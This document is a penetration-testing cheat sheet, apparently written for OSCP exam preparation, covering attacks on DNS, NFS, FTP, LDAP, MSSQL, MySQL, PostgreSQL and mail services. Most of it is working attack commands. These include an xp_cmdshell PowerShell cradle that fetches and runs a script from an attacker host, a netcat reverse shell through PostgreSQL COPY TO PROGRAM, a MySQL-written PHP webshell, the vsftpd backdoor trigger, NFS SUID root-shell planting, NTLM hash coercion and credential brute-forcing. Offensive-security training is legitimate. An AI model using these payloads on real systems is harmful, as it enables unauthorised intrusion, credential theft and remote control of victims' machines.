# Network Service Enumeration & Exploitation Methodology

### FTP · DNS · LDAP · MSSQL · MySQL · PostgreSQL · NFS · RPCbind · POP3/IMAP

Order below = the sequence you'd actually work these during an engagement/exam: cheap recon first (DNS, RPCbind→NFS, FTP), then directory service (LDAP), then databases (often chain to RCE), then mail (usually just cred harvesting/spray targets).

---

## 1. Port 53 — DNS

**Why first:** near-zero risk, can dump the whole internal namespace (hostnames, subdomains, mail servers) that seed every later step.

```bash
# Identify the server + version
dig version.bind CHAOS TXT @<target>
nmap -p53 -sV --script dns-nsid,dns-recursion <target>

# Zone transfer attempt (the big win — misconfigured AXFR)
dig axfr <domain> @<target>
dig axfr internal.<domain> @<target>
fierce --domain <domain> --dns-servers <target>

# Reverse zone transfer
dig -x <target> @<target> axfr

# Brute-force subdomains if AXFR is denied
gobuster dns -d <domain> -r <target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Manual record enumeration
for r in A AAAA MX NS TXT SOA CNAME SRV; do dig $r <domain> @<target> +short; done
```

**Decision point:** AXFR succeeds → mine returned hostnames for internal naming convention (feeds Kerberos usernames, vhosts for web enum, AD site names). AXFR refused → fall back to brute-force + OSINT (crt.sh, etc.).

---

## 2. Port 111 — RPCbind → 2049 NFS

**Why together:** RPCbind is just the portmapper; the actual payoff is whatever it points you to — almost always NFS on OSCP boxes.

```bash
# What services are registered
rpcinfo -p <target>
nmap -p111 --script rpcinfo <target>

# Enumerate NFS exports specifically
showmount -e <target>
nmap -p2049 --script nfs-showmount,nfs-ls,nfs-statfs <target>
```

**Decision point:** export shows `no_root_squash` or is world-writable →

```bash
mkdir /mnt/nfs_loot
mount -t nfs <target>:/<export_path> /mnt/nfs_loot -o nolock
ls -la /mnt/nfs_loot

# no_root_squash privesc/foothold: plant a SUID root shell from your attacker box
cp /bin/bash /mnt/nfs_loot/rootbash
chmod +xs /mnt/nfs_loot/rootbash
# then on the target (once you have any shell / or via the export mounted elsewhere):
/<export_path>/rootbash -p
```

If export is read-only or user-restricted, just loot it for creds/keys (`.ssh`, config files, `/etc/passwd`-like leftovers, web app source).

```bash
umount /mnt/nfs_loot
```

---

## 3. Port 21 — FTP

```bash
nmap -p21 -sV --script ftp-anon,ftp-syst,ftp-bounce,ftp-vsftpd-backdoor <target>

# Anonymous login
ftp <target>          # user: anonymous, pass: anything@anything.com
# or
lftp -u anonymous, <target>

# Once in: grab everything, check for write access
wget -r ftp://anonymous:anonymous@<target>/
# test upload (webshell staging if FTP root == webroot)
put shell.php
```

**Decision point (table):**

|Finding|Next move|
|---|---|
|Anonymous read+write, FTP root = web docroot|Upload webshell → RCE via HTTP|
|Anonymous read-only|Download everything, grep for creds/configs, check `.git`, `.bak`, `.old`|
|vsftpd 2.3.4 banner|Check for the known backdoor (`vsftpd-backdoor` nmap script / manual `USER x:)` then connect on 6200)|
|Login required|Brute-force with creds found elsewhere first (`hydra -L users.txt -P pass.txt ftp://<target>`) before generic spray|

```bash
# vsftpd 2.3.4 backdoor manual trigger
(echo "USER x:)"; sleep 1; echo "PASS x") | nc <target> 21
nc <target> 6200   # backdoor shell if triggered
```

---

## 4. Port 389 — LDAP

**Why here:** cheapest AD enumeration you can do pre-creds; anonymous bind is common on older/misconfigured DCs and is a goldmine.

```bash
nmap -p389 -sV --script ldap-rootdse,ldap-search <target>

# Anonymous bind test
ldapsearch -x -H ldap://<target> -s base namingcontexts
ldapsearch -x -H ldap://<target> -b "" -s base "(objectclass=*)" +

# If anonymous bind works, dump the domain
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" > ldap_full_dump.txt
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=user)" sAMAccountName description
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=group)" cn member

# With creds (or after ASREPRoast/Kerbrute gave you a valid user)
ldapsearch -x -H ldap://<target> -D "<domain>\<user>" -w '<pass>' -b "DC=<domain>,DC=<tld>"
netexec ldap <target> -u <user> -p '<pass>' --users
netexec ldap <target> -u <user> -p '<pass>' --groups
bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <target> -c all
```

**Decision point:** `description` fields on user objects frequently contain plaintext passwords — always grep them:

```bash
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=user)" description | grep -i description
```

Valid low-priv creds obtained → pivot straight into the full AD attack chain (Kerberoast/ASREPRoast/BloodHound edges) — see the separate AD methodology.

---

## 5. Port 1433 — MSSQL

```bash
nmap -p1433 -sV --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info <target>

# Auth attempts
netexec mssql <target> -u sa -p '<pass>'
netexec mssql <target> -u sa -p '' --local-auth        # empty sa password
impacket-mssqlclient <user>:'<pass>'@<target> -windows-auth   # domain auth
impacket-mssqlclient sa:'<pass>'@<target>                     # sql auth
```

Once connected (any of the above), standard MSSQL escalation path:

```sql
-- Check current context/privs
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM sys.server_principals;

-- Enable and use xp_cmdshell for RCE
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<attacker_ip>/shell.ps1'')"';
```

**Decision point:**

|Situation|Technique|
|---|---|
|`xp_cmdshell` disabled and re-enable fails (no sysadmin)|Try `sp_OACreate` COM object RCE, or trustworthy DB + `EXECUTE AS` impersonation chain|
|Linked servers present|`SELECT * FROM sys.servers;` → `EXECUTE('xp_cmdshell ''whoami''') AT [LINKED_SERVER];` (linked-server privesc, common exam vector)|
|Service account is domain account|Coerce/relay: MSSQL service often runs as a domain user usable for NTLM relay via `xp_dirtree \\<attacker_ip>\share` to capture/relay the hash|

```sql
EXEC master..xp_dirtree '\\<attacker_ip>\share';   -- forces auth attempt, capture with responder/ntlmrelayx
```

### NTLM Relay with Responder

```sh
sudo responder -I tun0 -A -v
```

```sh
SQL > xp_dirtree \\10.10.14.57\shares
```

---

## 6. Port 3306 — MySQL

```bash
nmap -p3306 -sV --script mysql-info,mysql-empty-password,mysql-enum <target>

# Auth
mysql -h <target> -u root -p
mysql -h <target> -u root --password=""     # empty root password (very common in OSCP)
netexec mysql <target> -u root -p ''
```

Once in:

```sql
show databases;
select user,authentication_string from mysql.user;   -- dump hashes if you have privs
show variables like 'secure_file_priv';               -- must be empty ('') to read/write files
select @@version, @@version_compile_os;
```

**Decision point:** `secure_file_priv` empty AND `FILE` privilege held → arbitrary file read/write:

```sql
-- Read
select load_file('/etc/passwd');

-- Write a webshell (needs known/guessable web docroot)
select "<?php system($_GET['cmd']); ?>" into outfile '/var/www/html/shell.php';
```

If write works and you land a webshell → RCE via HTTP. If only read → loot config files (`wp-config.php`, `.env`, app configs) for chained creds.

```bash
# Credential brute force if login unknown
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<target>
```

---

## 7. Port 5432 — PostgreSQL

```bash
nmap -p5432 -sV --script pgsql-brute <target>

# Auth
psql -h <target> -U postgres -d postgres
PGPASSWORD='<pass>' psql -h <target> -U postgres -d postgres
netexec postgres <target> -u postgres -p '<pass>'
```

Once in:

```sql
SELECT version();
\du                              -- list roles/privileges
SELECT usename, usesuper FROM pg_user;
```

**Decision point — RCE path if `usesuper = t`:**

```sql
-- COPY TO/FROM program (superuser only) = direct command execution
COPY (SELECT '') TO PROGRAM 'nc -e /bin/bash <attacker_ip> <port>';

-- Alternative: read/write arbitrary files
CREATE TABLE cmd_exec(t TEXT);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

```sql
-- File read without superuser (if lo_* large object functions available)
SELECT lo_import('/etc/passwd', 12345);
SELECT lo_get(12345);
```

```bash
# Default/weak creds are common — always try these first
psql -h <target> -U postgres -d postgres    # password: postgres
```

---

## 8/9. Port 110/995 POP3 · Port 143/993 IMAP

**Why last:** these are almost always credential-harvest/validation endpoints, not RCE vectors — enumerate them to confirm/spray discovered creds and read mailbox contents for further pivoting info.

```bash
# Service/version + capability enum
nmap -p110,995,143,993 -sV --script pop3-capabilities,imap-capabilities <target>

# Manual banner grab / STARTTLS check
nc -nv <target> 110
nc -nv <target> 143
openssl s_client -connect <target>:995 -quiet     # implicit TLS
openssl s_client -connect <target>:993 -quiet
```

**Credential validation / spray (this is the main use of these ports on OSCP):**

```bash
hydra -L users.txt -P passwords.txt pop3://<target>
hydra -L users.txt -P passwords.txt imap://<target>
netexec pop3 <target> -u users.txt -p passwords.txt      # if supported by your netexec build
```

**Manual mailbox read once creds confirmed (POP3):**

```
telnet <target> 110
USER <user>
PASS <pass>
LIST
RETR 1
```

**Manual mailbox read (IMAP):**

```
telnet <target> 143
a LOGIN <user> <pass>
a LIST "" "*"
a SELECT INBOX
a FETCH 1 BODY[TEXT]
```

**Decision point:** mailbox contains password-reset emails, internal URLs, or attachments → pull those threads; often the intended chain (e.g., a reset link or an attached credential file) to the next host/service.

---

## Priority Fast-Path (try these first, in this order)

1. **DNS AXFR** — free hostnames/naming convention, zero risk.
2. **NFS `no_root_squash`** — near-instant root if present.
3. **FTP anonymous** — check for write access into a web docroot for instant RCE.
4. **LDAP anonymous bind** — dump user `description` fields for cleartext creds.
5. **MySQL/Postgres/MSSQL with empty or default creds** (`root:""`, `postgres:postgres`, `sa:""`) — extremely common on OSCP boxes, always try before brute-forcing.
6. **MSSQL `xp_cmdshell`** once any valid login is found — fastest DB→RCE path.
7. **PostgreSQL `COPY TO PROGRAM`** if superuser — fastest DB→RCE path for Postgres.
8. **MySQL `INTO OUTFILE`** webshell if `secure_file_priv` is empty and docroot is known/guessable.
9. **POP3/IMAP** — spray any creds gathered from the above against these last; read mail for the next pivot.

---

Document _why_ each command was run in your notes as you go (which enumeration result justified it) — that reasoning trail is what the OSCP report actually grades, not just the final shell.